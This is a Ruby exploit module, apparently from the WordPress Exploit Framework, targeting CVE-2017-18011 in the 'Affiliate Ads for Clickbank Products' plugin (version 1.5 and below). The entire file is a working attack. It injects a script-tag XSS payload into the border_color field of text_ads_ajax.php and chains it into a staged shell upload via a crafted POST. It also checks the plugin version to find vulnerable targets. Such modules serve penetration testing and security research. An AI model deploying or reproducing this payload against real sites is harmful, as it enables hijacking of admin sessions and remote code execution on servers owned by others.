# frozen_string_literal: true

class Wpxf::Exploit::AffiliateAdsBuilderReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Affiliate Ads for Clickbank Products <= 1.5 Reflected XSS Shell Upload',
      author: [
        'Ricardo Sanchez', # Disclosure
        'rastating'        # WPXF module
      ],
      references: [
        ['CVE', '2017-18011'],
        ['WPVDB', '8989']
      ],
      date: 'Nov 14 2017'
    )
  end

  def check
    check_plugin_version_from_readme('affiliate-ads-builder-for-clickbank-products', '1.6')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_plugins, 'affiliate-ads-builder-for-clickbank-products', 'text_ads_ajax.php')
  end

  def xss_payload
    "\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>"
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'show_product_descr' => '1',
      'show_read_more_btn' => '1',
      'default_font_family' => '1',
      'fill_color' => '1',
      'border_color' => xss_payload,
      'link_color' => '2',
      'kws' => '1',
      'cols' => '1',
      'rows' => '1',
      'ref' => '1',
      'descr_color' => '1',
      'height_adjustment' => '1',
      'hide_footer' => '0'
    )
  end
end
